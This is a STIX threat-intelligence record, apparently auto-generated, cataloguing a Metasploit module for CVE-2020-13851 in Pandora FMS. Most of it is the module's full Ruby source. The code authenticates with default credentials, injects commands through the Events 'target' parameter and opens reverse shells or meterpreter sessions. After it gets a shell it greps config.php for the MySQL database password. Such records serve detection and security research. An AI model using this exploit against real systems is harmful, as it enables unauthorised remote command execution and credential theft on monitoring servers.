{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ddbf9761-c578-409c-aa5d-01ef79dd2e2d",
    "created": "2024-08-14T17:03:18.652465Z",
    "modified": "2024-08-14T17:03:18.652469Z",
    "name": "Pandora FMS Events Remote Command Execution",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/pandora_fms_events_exec.rb",
            "external_id": "pandora_fms_events_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pandora FMS Events Remote Command Execution',\n        'Description' => %q{\n          This module exploits a vulnerability (CVE-2020-13851) in Pandora\n          FMS versions 7.0 NG 742, 7.0 NG 743, and 7.0 NG 744 (and perhaps\n          older versions) in order to execute arbitrary commands.\n\n          This module takes advantage of a command injection vulnerability in the\n          `Events` feature of Pandora FMS. This flaw allows users to execute\n          arbitrary commands via the `target` parameter in HTTP POST requests to\n          the `Events` function. After authenticating to the target, the module\n          attempts to exploit this flaw by issuing such an HTTP POST request,\n          with the `target` parameter set to contain the payload. If a shell is\n          obtained, the module will try to obtain the local MySQL database\n          password via a simple `grep` command on the plaintext\n          `/var/www/html/pandora_console/include/config.php` file.\n\n          Valid credentials for a Pandora FMS account are required. The account\n          does not need to have admin privileges.\n          This module has been successfully tested on Pandora 7.0 NG 744 running\n          on CentOS 7 (the official virtual appliance ISO for this version).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Fernando Catoira', # Discovery\n          'Julio Sanchez', # Discovery\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-13851'], # RCE via the `events` feature\n          ['URL', 'https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities']\n        ],\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],\n        'Targets' => [\n          [\n            'Linux (x86)', {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (x64)', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-06-04',\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options [\n      OptString.new('TARGETURI', [true, 'Base path to Pandora FMS', '/pandora_console/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pandora'])\n    ]\n  end\n\n  def check\n    vprint_status('Running check')\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'index.php')\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res.code == 200 && res.body.include?('<title>Pandora FMS - the Flexible Monitoring System</title>')\n      return CheckCode::Safe('Target is not a Pandora FMS application.')\n    end\n\n    @cookie = res.get_cookies\n    html = res.get_html_document\n    full_version = html.at('div[@id=\"ver_num\"]')\n\n    if full_version.blank?\n      return CheckCode::Detected('Could not determine the Pandora FMS version.')\n    end\n\n    full_version = full_version.text\n\n    version = full_version[1..].sub('NG', '')\n\n    if version.blank?\n      return CheckCode::Detected('Could not determine the Pandora FMS version.')\n    end\n\n    version = Rex::Version.new version\n\n    unless version <= Rex::Version.new('7.0.744')\n      return CheckCode::Safe(\"Target is Pandora FMS version #{full_version}.\")\n    end\n\n    CheckCode::Appears(\"Target is Pandora FMS version #{full_version}.\")\n  end\n\n  def login(user, pass)\n    vprint_status \"Authenticating as #{user} ...\"\n\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'cookie' => @cookie,\n      'vars_get' => { 'login' => '1' },\n      'vars_post' => {\n        'nick' => user,\n        'pass' => pass,\n        'login_button' => 'Login'\n      }\n    })\n\n    unless res.code == 200 && res.body.include?('<b>Pandora FMS Overview</b>')\n      fail_with Failure::NoAccess, 'Authentication failed'\n    end\n\n    print_good \"Authenticated as user #{user}.\"\n  end\n\n  def on_new_session(client)\n    super\n    if target.arch.first == ARCH_CMD\n      print_status('Trying to read the MySQL DB password from include/config.php. The default privileged user is `root`.')\n      client.shell_write(\"grep dbpass include/config.php\\n\")\n    else\n      print_status('Tip: You can try to obtain the MySQL DB password via the shell command `grep dbpass include/config.php`. The default privileged user is `root`.')\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status('Executing payload...')\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax.php'),\n      'cookie' => @cookie,\n      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n      'Referer' => full_uri('index.php'),\n      'vars_get' => {\n        'sec' => 'eventos',\n        'sec2' => 'operation/events/events'\n      },\n      'vars_post' => {\n        'page' => 'include/ajax/events',\n        'perform_event_response' => '10000000',\n        'target' => cmd.to_s,\n        'response_id' => '1'\n      }\n    }, 0) # the server will not send a response, so the module shouldn't wait for one\n  end\n\n  def exploit\n    login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    if target.arch.first == ARCH_CMD\n      execute_command payload.encoded\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-06-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}